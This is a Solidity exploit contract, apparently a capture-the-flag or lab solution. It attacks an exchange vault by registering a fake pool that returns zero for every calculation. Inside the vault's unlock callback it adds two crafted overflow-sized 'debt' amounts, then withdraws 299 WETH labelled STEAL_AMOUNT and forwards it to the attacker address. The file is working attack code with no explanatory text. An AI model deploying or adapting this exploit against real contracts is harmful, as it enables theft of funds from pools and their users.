// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IPoolLike {
    function calculateLiquidityAddition(
        uint256[] calldata currentBalances,
        uint256[] calldata amountsSupplied,
        uint256 lpTotalSupply
    ) external returns (uint256);

    function calculateLiquidityRemoval(
        uint256[] calldata currentBalances,
        uint256 lpAmount,
        uint256 lpTotalSupply
    ) external returns (uint256[] memory);

    function computeSwapAmount(
        uint256[] calldata currentBalances,
        uint256 inputAmount,
        IERC20Like tokenIn,
        IERC20Like tokenOut
    ) external returns (uint256);
}

interface IExchangeVaultLike {
    function registerPool(IPoolLike pool, IERC20Like[] calldata tokens) external;
    function addLiquidityToPool(IPoolLike pool, uint256[] calldata amounts, address to) external;
    function sendTo(IERC20Like token, address to, uint256 amount) external;
    function unlock(bytes calldata data) external returns (bytes memory);
}

contract FakePool is IPoolLike {
    function calculateLiquidityAddition(
        uint256[] calldata,
        uint256[] calldata,
        uint256
    ) external pure returns (uint256) {
        return 0;
    }

    function calculateLiquidityRemoval(
        uint256[] calldata,
        uint256,
        uint256
    ) external pure returns (uint256[] memory amountsOut) {
        amountsOut = new uint256[](2);
    }

    function computeSwapAmount(
        uint256[] calldata,
        uint256,
        IERC20Like,
        IERC20Like
    ) external pure returns (uint256) {
        return 0;
    }
}

contract Attck {
    IERC20Like public constant weth = IERC20Like(0x13d78a4653e4E18886FBE116FbB9065f1B55Cd1d);
    IERC20Like public constant usdc = IERC20Like(0xBf1C7F6f838DeF75F1c47e9b6D3885937F899B7C);
    IExchangeVaultLike public constant exchangeVault =
        IExchangeVaultLike(0x776B51e76150de6D50B06fD0Bd045de0a13D68C7);

    uint256 private constant STEAL_AMOUNT = 299 ether;
    uint256 private constant NEGATIVE_DEBT_AMOUNT =
        57878681014353791574313198544780519770703781198460743796589815059438733200008;
    uint256 private constant OFFSETTING_DEBT_AMOUNT =
        57878681014353791574313198544780519770703781198460743796290904732536803778835;

    address public attacker;
    FakePool public fakePool;

    constructor() {
        attacker = msg.sender;
        fakePool = new FakePool();
    }

    function Attack() external {
        require(msg.sender == attacker, "only attacker");

        IERC20Like[] memory tokens = new IERC20Like[](2);
        tokens[0] = weth;
        tokens[1] = usdc;
        exchangeVault.registerPool(fakePool, tokens);

        exchangeVault.unlock(abi.encodeWithSelector(this.drain.selector));

        uint256 bal = weth.balanceOf(address(this));
        if (bal > 0) {
            weth.transfer(attacker, bal);
        }
    }

    function drain() external {
        require(msg.sender == address(exchangeVault), "only vault");

        uint256[] memory amounts = new uint256[](2);
        amounts[0] = NEGATIVE_DEBT_AMOUNT;
        exchangeVault.addLiquidityToPool(fakePool, amounts, address(this));

        amounts[0] = OFFSETTING_DEBT_AMOUNT;
        exchangeVault.addLiquidityToPool(fakePool, amounts, address(this));

        exchangeVault.sendTo(weth, address(this), STEAL_AMOUNT);
    }
}
